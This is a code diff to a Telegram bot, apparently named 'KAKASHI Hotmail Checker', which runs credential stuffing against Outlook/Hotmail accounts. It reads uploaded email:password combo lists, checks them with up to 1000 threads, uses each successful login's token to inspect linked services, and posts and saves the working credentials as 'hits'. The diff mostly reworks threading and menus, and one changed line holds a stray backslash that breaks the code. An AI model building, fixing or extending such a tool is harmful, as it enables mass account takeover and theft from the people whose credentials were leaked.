@@ -1,3 +1,4 @@
+# ====================== bot.py ======================
 import os
 import sys
 import time
@@ -8,7 +9,6 @@ import threading
 import concurrent.futures
 import random
 import re
-import asyncio
 from threading import Lock, Semaphore
 
 from colorama import init
@@ -17,13 +17,12 @@ from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQu
 
 from services import services
 
-# ====================== BOT TOKEN ======================
 TOKEN = os.getenv("TOKEN")
 if not TOKEN or TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE":
-    print("❌ TOKEN environment variable set nahi hai! Railway Variables mein TOKEN daal do.")
+    print("❌ TOKEN set nahi hai! Railway Variables mein TOKEN daal do.")
     sys.exit(1)
 
-print("✅ Token loaded successfully! Video style bot starting...")
+print("✅ Token loaded! Video style bot starting...")
 
 lock = threading.Lock()
 hit = bad = retry = processed = total_combos = 0
@@ -32,7 +31,7 @@ checked_accounts = set()
 rate_limit_semaphore = Semaphore(500)
 progress_message_id = None
 
-user_data = {}  # user_id -> settings
+user_data = {}
 
 init(autoreset=True)
 
@@ -50,13 +49,13 @@ def create_progress_bar(percentage, length=25):
     bar = "█" * filled + "░" * (length - filled)
     return f"[{bar}] {percentage:.1f}%"
 
-async def send_message_safe(context, chat_id, text, parse_mode='HTML'):
+def send_message_safe(bot, chat_id, text, parse_mode='HTML'):
     try:
-        await context.bot.send_message(chat_id=chat_id, text=text, parse_mode=parse_mode)
+        bot.send_message(chat_id=chat_id, text=text, parse_mode=parse_mode)
     except Exception as e:
         print(f"Send message error: {e}")
 
-async def update_progress_message(context, chat_id):
+def update_progress_message(bot, chat_id):
     global progress_message_id
     while processed < total_combos and total_combos > 0:
         with lock:
@@ -75,13 +74,13 @@ async def update_progress_message(context, chat_id):
 """
         try:
             if progress_message_id:
-                await context.bot.edit_message_text(chat_id=chat_id, message_id=progress_message_id, text=msg, parse_mode='HTML')
+                bot.edit_message_text(chat_id=chat_id, message_id=progress_message_id, text=msg, parse_mode='HTML')
             else:
-                sent = await context.bot.send_message(chat_id=chat_id, text=msg, parse_mode='HTML')
+                sent = bot.send_message(chat_id=chat_id, text=msg, parse_mode='HTML')
                 progress_message_id = sent.message_id
         except:
             pass
-        await asyncio.sleep(5)
+        time.sleep(5)
 
 def get_flag(country_name):
     try:
@@ -105,7 +104,7 @@ def save_account_by_type(service_name, email, password):
         with lock:
             linked_accounts[service_name] = linked_accounts.get(service_name, 0) + 1
 
-def get_capture(email, password, token, cid, context, update):
+def get_capture(email, password, token, cid, bot, chat_id):
     global hit
     try:
         headers = {"User-Agent": "Outlook-Android/2.0", "Authorization": f"Bearer {token}", "X-AnchorMailbox": f"CID:{cid}"}
@@ -127,7 +126,7 @@ def get_capture(email, password, token, cid, context, update):
         linked_str = "\n".join(linked_services) if linked_services else "No linked services found"
 
         capture = f"""
-🔱 HOTMAİL HİT BULUNDU 🔱
+🔱 HOTMAİL HÍT BULUNDU 🔱
 ⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
 📧 Email: {email}
 🔑 Password: {password}
@@ -141,7 +140,7 @@ def get_capture(email, password, token, cid, context, update):
 ⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
 𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @HotmailCheckerV1_BBOT
 """
-        asyncio.run(send_message_safe(context, update.effective_chat.id, capture.strip()))
+        send_message_safe(bot, chat_id, capture.strip())
         with open('Hotmail-Hits.txt', 'a', encoding='utf-8') as f:
             f.write(capture + "\n" + "="*60 + "\n")
 
@@ -195,7 +194,7 @@ def check_account(email, password):
     except Exception:
         return {"status": "RETRY"}
 
-def check_combo(email, password, context, update):
+def check_combo(email, password, bot, chat_id):
     global hit, bad, retry, processed
     account_id = f"{email}:{password}"
     if account_id in checked_accounts:
@@ -208,7 +207,7 @@ def check_combo(email, password, context, update):
         result = check_account(email, password)
         with lock:
             if result.get("status") == "HIT":
-                get_capture(email, password, result.get("token"), result.get("cid"), context, update)
+                get_capture(email, password, result.get("token"), result.get("cid"), bot, chat_id)
             elif result.get("status") == "BAD":
                 bad += 1
             else:
@@ -226,9 +225,9 @@ def validate_combo(file_path):
         f.write("\n".join(valid) + "\n")
     return len(valid)
 
-# ====================== KEYBOARDS (Video Jaisa) ======================
 def main_menu_keyboard():
     keyboard = [
+        [InlineKeyboardButton("🚀 Start Checking", callback_data="start_checking")],
         [InlineKeyboardButton("🔑 Keywords", callback_data="menu_keywords"), InlineKeyboardButton("⚡ Speed", callback_data="menu_speed")],
         [InlineKeyboardButton("📊 Stats Menu", callback_data="menu_stats"), InlineKeyboardButton("🎯 My Hits", callback_data="menu_hits")],
         [InlineKeyboardButton("👤 My Profile", callback_data="menu_profile"), InlineKeyboardButton("🏆 Leaderboard", callback_data="menu_leaderboard")],
@@ -273,7 +272,6 @@ def keywords_keyboard(selected, page=0, per_page=10):
 
     return InlineKeyboardMarkup(keyboard)
 
-# ====================== HANDLERS ======================
 SELECT_CATEGORY, UPLOAD_COMBO, ENTER_THREADS = range(3)
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -295,7 +293,14 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_data[user_id] = {"selected_services": set(), "speed_mode": "Medium"}
     selected = user_data[user_id]["selected_services"]
 
-    if data == "menu_keywords":
+    if data == "start_checking":
+        if not selected:
+            await query.edit_message_text("❌ Pehle Keywords select karo!", reply_markup=main_menu_keyboard())
+            return SELECT_CATEGORY
+        await query.edit_message_text("📤 Send your combo file (.txt)")
+        return UPLOAD_COMBO
+
+    elif data == "menu_keywords":
         context.user_data["current_page"] = 0
         await query.edit_message_text("🔑 Keywords - Page 1/5\nSelect services:", reply_markup=keywords_keyboard(selected, 0))
 
@@ -325,8 +330,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(f"🔑 Keywords - Page {page+1}/5\nSelect services:", reply_markup=keywords_keyboard(selected, page))
 
     elif data == "done_keywords":
-        await query.edit_message_text(f"✅ {len(selected)} services selected!\nNow send your combo file (.txt)")
-        return UPLOAD_COMBO
+        await query.edit_message_text("✅ Keywords saved! Back to Main Menu", reply_markup=main_menu_keyboard())
+        return SELECT_CATEGORY
 
     elif data == "back_to_main":
         await query.edit_message_text("🔥 Hotmail Checker Main Menu", reply_markup=main_menu_keyboard())
@@ -345,8 +350,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data.startswith("speed_"):
         mode = data[6:]
         user_data[user_id]["speed_mode"] = mode
-        await query.edit_message_text(f"✅ Speed set to {mode}!\nNow send combo file.", reply_markup=None)
-        return UPLOAD_COMBO
+        await query.edit_message_text(f"✅ Speed set to {mode}!", reply_markup=main_menu_keyboard())
+        return SELECT_CATEGORY
+
+    else:
+        await query.edit_message_text("🔥 Coming soon... More features added soon!", reply_markup=main_menu_keyboard())
 
     return SELECT_CATEGORY
 
@@ -369,15 +377,13 @@ async def receive_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data['threads'] = threads
         await update.message.reply_text(f"🚀 Added to Queue! Position #1\nScanning will start automatically...")
 
-        # FIXED: Proper background execution
-        loop = asyncio.get_running_loop()
-        loop.run_in_executor(None, run_checker, context, update)
+        threading.Thread(target=run_checker, args=(context.bot, update.effective_chat.id, threads), daemon=True).start()
         return ConversationHandler.END
     except:
         await update.message.reply_text("❌ Valid number (1-1000) bhejo")
         return ENTER_THREADS
 
-def run_checker(context, update):
+def run_checker(bot, chat_id, threads):
     global total_combos, processed, hit, bad, retry, linked_accounts, progress_message_id
     hit = bad = retry = processed = 0
     linked_accounts.clear()
@@ -388,22 +394,21 @@ def run_checker(context, update):
         lines = [line.strip() for line in f if ":" in line]
     total_combos = len(lines)
 
-    asyncio.run(send_message_safe(context, update.effective_chat.id, f"📊 Total combos: {total_combos}\nStarting check..."))
+    send_message_safe(bot, chat_id, f"📊 Total combos: {total_combos}\nStarting check...")
 
-    # Start live progress bar
-    loop = asyncio.get_running_loop()
-    loop.run_in_executor(None, lambda: asyncio.run(update_progress_message(context, update.effective_chat.id)))
+    progress_thread = threading.Thread(target=update_progress_message, args=(bot, chat_id), daemon=True)
+    progress_thread.start()
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=context.user_data.get('threads', 80)) as executor:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
         for line in lines:
             try:
                 email, pw = line.split(":", 1)
-                executor.submit(check_combo, email.strip(), pw.strip(), context, update)
+                executor.submit(check_combo, email.strip(), pw.strip(), bot, chat_id)
             except:
                 continue
 
     time.sleep(5)
-    asyncio.run(send_message_safe(context, update.effective_chat.id, f"✅ Check Completed!\nTotal Hits: {hit} | Bad: {bad} | Retries: {retry}"))
+    send_message_safe(bot, chat_id, f"✅ Check Completed!\nTotal Hits: {hit} | Bad: {bad} | Retries: {retry}")
 
 def main():
     if not os.path.exists("Accounts"):
@@ -416,14 +421,14 @@ def main():
         states={
             SELECT_CATEGORY: [CallbackQueryHandler(button_handler)],
             UPLOAD_COMBO: [MessageHandler(filters.Document.ALL, receive_combo)],
-            ENTER_THREADS: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_threads)],
+            ENTER_THREADS: [MessageHandler(filters.TEXT & \~filters.COMMAND, receive_threads)],
         },
         fallbacks=[],
     )
     
     app.add_handler(conv_handler)
-    print("🤖 KAKASHI Hotmail Checker (Full Video Style - Fixed) is running... Send /start")
-    app.run_polling(allowed_updates=Update.ALL_TYPES)
+    print("🤖 KAKASHI Hotmail Checker (FULL VIDEO STYLE) is running... Send /start")
+    app.run_polling()
 
 if __name__ == "__main__":
     main()
